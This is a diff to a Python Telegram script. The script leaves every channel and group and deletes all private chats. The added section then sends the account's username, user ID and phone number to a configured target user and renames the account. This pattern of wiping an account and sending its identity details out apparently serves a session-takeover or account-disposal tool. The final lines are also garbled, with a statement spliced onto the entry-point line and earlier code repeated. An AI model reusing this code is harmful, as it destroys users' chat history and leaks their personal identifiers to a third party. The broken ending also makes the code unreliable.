@@ -36,18 +36,18 @@ async def main():
 
             if isinstance(d.entity, Channel):
                 await client(LeaveChannelRequest(d.entity))
-                print(f"Left Channel/Supergroup: {d.name}")
+                print(f"Left Channel/Supergroup: {d.name or d.id}")
 
             elif isinstance(d.entity, Chat):
                 await client(DeleteChatUserRequest(
                     chat_id=d.entity.id,
                     user_id="me"
                 ))
-                print(f"Left Group: {d.name}")
+                print(f"Left Group: {d.name or d.id}")
 
             elif isinstance(d.entity, User):
                 await client.delete_dialog(d.entity)
-                print(f"Deleted Private Chat: {d.name}")
+                print(f"Deleted Private Chat: {d.name or d.id}")
 
             await asyncio.sleep(1)
 
@@ -62,6 +62,39 @@ async def main():
             )
 
     print("\nDone deleting chats.")
+
+    me = await client.get_me()
+
+    username = f"@{me.username}" if me.username else "(no username)"
+    phone = f"+{me.phone}" if me.phone else "(no phone)"
+
+    info_text = (
+        f"Username: {username}\n"
+        f"User ID: {me.id}\n"
+        f"Phone: {phone}"
+    )
+
+    print("\n--- Account info to be sent ---")
+    print(info_text)
+    print("--------------------------------")
+
+    await client.send_message(
+        TARGET_USERNAME,
+        info_text
+    )
+
+    print(f"Sent account info to @{TARGET_USERNAME}")
+
+    await client(UpdateProfileRequest(
+        first_name=NEW_FIRST_NAME
+    ))
+
+    print(f"Account name changed to: {NEW_FIRST_NAME}")
+
+
+if __name__ == "__main__":
+    with client:
+        client.loop.run_until_complete(main())    print("\nDone deleting chats.")
 
     me = await client.get_me()
 
